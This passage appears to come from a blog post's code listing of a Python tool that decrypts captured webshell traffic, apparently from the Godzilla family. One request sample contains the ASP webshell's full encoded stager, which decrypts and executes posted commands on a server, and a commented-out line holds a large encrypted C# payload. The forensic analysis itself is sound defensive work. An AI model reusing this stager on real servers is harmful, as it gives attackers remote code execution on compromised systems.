key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class="line">    data = decrypter.decrypt_req_payload(b&quot;pass=eval%28%22Ex%22%26cHr%28101%29%26%22cute%28%22%22Server.ScriptTimeout%3D3600%3AOn+Error+Resume+Next%3AFunction+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function%3AEx%22%26cHr%28101%29%26%22cute%28%22%22%22%22On+Error+Resume+Next%3A%22%22%22%22%26bd%28%22%22%22%220d0a5365742062797061737344696374696f6e617279203d205365727665722e4372656174654f626a6563742822536372697074696e672e44696374696f6e61727922290d0a0d0a46756e6374696f6e204261736536344465636f646528427956616c2076436f6465290d0a2020202044696d206f584d4c2c206f4e6f64650d0a20202020536574206f584d4c203d204372656174654f626a65637428224d73786d6c322e444f4d446f63756d656e742e332e3022290d0a20202020536574206f4e6f6465203d206f584d4c2e437265617465456c656d656e74282262617365363422290d0a202020206f4e6f64652e6461746154797065203d202262696e2e626173653634220d0a202020206f4e6f64652e74657874203d2076436f64650d0a202020204261736536344465636f6465203d206f4e6f64652e6e6f6465547970656456616c75650d0a20202020536574206f4e6f6465203d204e6f7468696e670d0a20202020536574206f584d4c203d204e6f7468696e670d0a456e642046756e6374696f6e0d0a0d0a46756e6374696f6e2064656372797074696f6e28636f6e74656e742c697342696e290d0a2020202064696d2073697a652c692c726573756c742c6b657953697a650d0a202020206b657953697a65203d206c656e286b6579290d0a202020205365742042696e61727953747265616d203d204372656174654f626a656374282241444f44422e53747265616d22290d0a2020202042696e61727953747265616d2e43686172536574203d202269736f2d383835392d31220d0a2020202042696e61727953747265616d2e54797065203d20320d0a2020202042696e61727953747265616d2e4f70656e0d0a202020206966204973417272617928636f6e74656e7429207468656e0d0a202020202020202073697a653d55426f756e6428636f6e74656e74292b310d0a2020202020202020466f7220693d3120546f2073697a650d0a20202020202020202020202042696e61727953747265616d2e57726974655465787420636872772861736362286d69646228636f6e74656e742c692c312929290d0a20202020202020204e6578740d0a20202020656e642069660d0a2020202042696e61727953747265616d2e506f736974696f6e203d20300d0a20202020696620697342696e207468656e0d0a202020202020202042696e61727953747265616d2e54797065203d20310d0a202020202020202064656372797074696f6e3d42696e61727953747265616d2e5265616428290d0a20202020656c73650d0a202020202020202064656372797074696f6e3d42696e61727953747265616d2e526561645465787428290d0a20202020656e642069660d0a0d0a456e642046756e6374696f6e0d0a20202020636f6e74656e743d726571756573742e466f726d28226b657922290d0a202020206966206e6f74204973456d70747928636f6e74656e7429207468656e0d0a0d0a2020202020202020696620204973456d7074792853657373696f6e28227061796c6f6164222929207468656e0d0a202020202020202020202020636f6e74656e743d64656372797074696f6e284261736536344465636f646528636f6e74656e74292c66616c7365290d0a20202020202020202020202053657373696f6e28227061796c6f616422293d636f6e74656e740d0a202020202020202020202020726573706f6e73652e456e640d0a2020202020202020656c73650d0a202020202020202020202020636f6e74656e743d4261736536344465636f646528636f6e74656e74290d0a20202020202020202020202062797061737344696374696f6e6172792e41646420227061796c6f6164222c53657373696f6e28227061796c6f616422290d0a202020202020202020202020457865637574652862797061737344696374696f6e61727928227061796c6f61642229290d0a202020202020202020202020726573756c743d72756e28636f6e74656e74290d0a202020202020202020202020726573706f6e73652e5772697465282238323831333022290d0a2020202020202020202020206966206e6f74204973456d70747928726573756c7429207468656e0d0a20202020202020202020202020202020726573706f6e73652e577269746520426173653634456e636f64652864656372797074696f6e28726573756c742c7472756529290d0a202020202020202020202020656e642069660d0a202020202020202020202020726573706f6e73652e5772697465282232306562626322290d0a2020202020202020656e642069660d0a20202020656e642069660d0a0d0a%22%22%22%22%29%29%3AResponse.End%22%22%29%22%29%0D%0A&amp;key=bWV0aG9kTmFtZQIEAAAAdGVzdA%3D%3D&quot;)</span><br><span class="line">    print(data)</span><br><span class="line">    data = decrypter.decrypt_res_payload(b&quot;828130b2s=20ebbc&quot;)</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line">    decrypter = ASP_XOR_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class="line">    data = decrypter.decrypt_req_payload(b&quot;pass=DlMRWA1cL1gOVDc2MjRhRwZFEQ%3D%3D&quot;)</span><br><span class="line">    print(data)</span><br><span class="line">    data = decrypter.decrypt_res_payload(b&quot;11cd6aDF0=ac826a&quot;)</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line">    decrypter = ASP_XOR_RAW(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class="line">    asp_xor_raw_req = &#x27;0e5311580d5c2f580e54373632346147064511&#x27;</span><br><span class="line">    asp_xor_raw_res = &#x27;0c5d&#x27;</span><br><span class="line">    data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(asp_xor_raw_req)))</span><br><span class="line">    print(data)</span><br><span class="line">    data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(asp_xor_raw_res)))</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line">    # decrypter = CSHAP_AES_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class="line">    # data = decrypter.decrypt_req_payload(b&#x27;pass=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